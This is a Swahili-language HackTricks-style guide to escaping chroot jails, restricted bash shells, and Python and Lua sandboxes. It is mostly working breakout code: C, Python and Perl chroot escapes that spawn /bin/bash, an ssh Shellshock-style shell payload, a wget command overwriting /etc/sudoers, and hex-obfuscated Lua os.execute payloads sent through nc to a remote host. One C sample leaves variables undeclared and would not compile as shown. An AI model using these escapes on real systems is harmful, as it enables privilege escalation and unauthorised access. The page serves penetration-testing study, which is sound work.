# Kutoroka kutoka kwa Jails

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

## **GTFOBins**

**Tafuta katika** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **kama unaweza kutekeleza binary yoyote yenye mali ya "Shell"**

## Chroot Escapes

Kutoka [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mekanismu ya chroot **haikusudiwi kulinda** dhidi ya kuingilia kati kwa makusudi na **watumiaji wenye mamlaka** (**root**). Katika mifumo mingi, muktadha wa chroot haujajumuika vizuri na programu zilizochrooted **zikiwa na mamlaka ya kutosha zinaweza kufanya chroot ya pili ili kutoroka**.\
Kawaida hii inamaanisha kwamba ili kutoroka unahitaji kuwa root ndani ya chroot.

{% hint style="success" %}
**Zana** [**chw00t**](https://github.com/earthquake/chw00t) iliumbwa ili kutumia hali zifuatazo na kutoroka kutoka `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Ikiwa wewe ni **root** ndani ya chroot unaweza **kutoroka** kwa kuunda **chroot nyingine**. Hii ni kwa sababu chroots 2 cannot coexists (katika Linux), hivyo ikiwa utaunda folda na kisha **kuunda chroot mpya** kwenye folda hiyo mpya ukiwa **nje yake**, sasa utakuwa **nje ya chroot mpya** na hivyo utakuwa kwenye FS.

Hii inatokea kwa sababu kawaida chroot HAHAHUSU kazi yako ya saraka kwa ile iliyoonyeshwa, hivyo unaweza kuunda chroot lakini uwe nje yake.
{% endhint %}

Kawaida hutapata binary ya `chroot` ndani ya jela ya chroot, lakini unaweza **kuunda, kupakia na kutekeleza** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Hii ni sawa na kesi ya awali, lakini katika kesi hii **mshambuliaji anahifadhi kiashiria cha faili kwa saraka ya sasa** na kisha **anaunda chroot katika folda mpya**. Hatimaye, kwa kuwa ana **ufikiaji** wa **FD** hiyo **nje** ya chroot, anaiweza na **anatoroka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD inaweza kupitishwa kupitia Unix Domain Sockets, hivyo:

* Unda mchakato wa mtoto (fork)
* Unda UDS ili mzazi na mtoto waweze kuzungumza
* Endesha chroot katika mchakato wa mtoto katika folda tofauti
* Katika mchakato wa mzazi, unda FD ya folda ambayo iko nje ya chroot ya mchakato mpya wa mtoto
* Pitisha kwa mchakato wa mtoto hiyo FD kwa kutumia UDS
* Mchakato wa mtoto chdir kwa hiyo FD, na kwa sababu iko nje ya chroot yake, atakimbia kutoka gerezani
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Kuunganisha kifaa cha mzizi (/) ndani ya folda ndani ya chroot
* Kuingia chroot katika folda hiyo

Hii inawezekana katika Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Kuunganisha procfs ndani ya folda ndani ya chroot (ikiwa bado haijafanywa)
* Tafuta pid ambayo ina kiingilio tofauti cha root/cwd, kama: /proc/1/root
* Chroot katika kiingilio hicho
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Unda Fork (mchakato wa mtoto) na chroot katika folda tofauti ndani ya FS na CD juu yake
* Kutoka kwa mchakato wa mzazi, hamasisha folda ambapo mchakato wa mtoto uko katika folda ya awali ya chroot ya watoto
* Mchakato huu wa watoto utaona uko nje ya chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Wakati fulani watumiaji wangeweza kubaini michakato yao wenyewe kutoka kwa mchakato wa wenyewe... lakini hii haiwezekani kwa kawaida tena
* Hata hivyo, ikiwa inawezekana, unaweza ptrace katika mchakato na kutekeleza shellcode ndani yake ([ona mfano huu](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Pata taarifa kuhusu gereza:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modify PATH

Angalia kama unaweza kubadilisha variable ya mazingira ya PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Kutumia vim
```bash
:set shell=/bin/sh
:shell
```
### Create script

Angalia kama unaweza kuunda faili inayoweza kutekelezwa yenye _/bin/bash_ kama maudhui
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Pata bash kutoka SSH

Ikiwa unapata kupitia ssh unaweza kutumia hila hii kutekeleza shell ya bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Tangaza
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Unaweza kuandika upya kwa mfano faili ya sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Njia Nyingine

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Inaweza pia kuwa ya kuvutia ukurasa:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Njia za kutoroka kutoka kwa jails za python katika ukurasa ufuatao:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Katika ukurasa huu unaweza kupata kazi za kimataifa unazo na ufikiaji ndani ya lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval na utekelezaji wa amri:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Baadhi ya mbinu za **kuita kazi za maktaba bila kutumia nukta**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Orodhesha kazi za maktaba:
```bash
for k,v in pairs(string) do print(k,v) end
```
Kumbuka kwamba kila wakati unatekeleza mstari wa awali katika **mazingira tofauti ya lua, mpangilio wa kazi hubadilika**. Hivyo basi, ikiwa unahitaji kutekeleza kazi maalum unaweza kufanya shambulio la nguvu ya kikatili kwa kupakia mazingira tofauti ya lua na kuita kazi ya kwanza ya le maktaba:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Pata shell ya lua ya mwingiliano**: Ikiwa uko ndani ya shell ya lua iliyo na mipaka unaweza kupata shell mpya ya lua (na matumaini isiyo na mipaka) kwa kuita:
```bash
debug.debug()
```
## References

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
